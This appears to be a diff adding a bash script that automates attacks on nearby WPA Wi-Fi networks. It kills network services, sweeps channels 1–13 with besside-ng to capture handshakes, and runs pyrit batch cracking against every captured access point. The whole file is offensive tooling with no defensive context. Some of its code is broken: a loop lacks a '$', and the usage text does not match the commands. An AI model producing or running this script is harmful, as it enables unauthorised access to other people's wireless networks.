@@ -1,0 +1,70 @@
+#!/bin/bash
+WLAN_IFACE=wlan0
+MON_IFACE=mon0
+
+function get_handshakes {
+	/etc/init.d/network-manager stop
+	/etc/init.d/networking stop
+	/etc/init.d/avahi-daemon stop
+	/etc/init.d/wicd stop
+	airmon-ng stop mon0
+
+	airmon-ng check kill
+	sleep 5
+	airmon-ng start $WLAN_IFACE
+	iter=1
+
+	while [ $iter -lt 14 ] ; do 
+		rm besside.log
+		besside-ng -c $( echo $iter ) mon0 &
+		sleep 120
+		killall -15 besside-ng
+		sleep 3
+		killall -9 besside-ng 
+		iter=$(( 1 + $iter ))
+	done
+}
+
+function create_essids {
+	pyrit -r wpa.cap analyze|grep AccessPoint | cut -d "'" -f 2 > ap_list
+	readarray ap_array < ap_list
+
+	for ap_essid in ${ap_array[@]}
+	do :
+		pyrit -e $ap_essid create_essid
+	done
+}
+
+function attack_bssids {
+	pyrit -r wpa.cap analyze|grep AccessPoint | cut -d " " -f 3 > bssid_list
+	readarray ap_bssid_array < bssid_list
+	
+	for ap_bssid in "{ap_bssid_array[@]}"
+	do :
+		pyrit -b $ap_bssid -r wpa.cap -o $ap_bssid attack_batch
+	done
+}
+
+
+function install_dependencies {
+	apt-get update
+	apt-get -y upgrade
+	apt-get -y install pyrit python-pip 
+	pip install gcloud
+}
+
+case "$1" in
+  handshakes)
+	get_handshakes
+	;;
+  create)
+	create_essids	
+	;;
+  attack)
+	attack_bssids
+	;;
+  *)
+	echo "Usage: $SCRIPTNAME {handshakes|create_essids|attack}" >&2
+	exit 3
+	;;
+esac
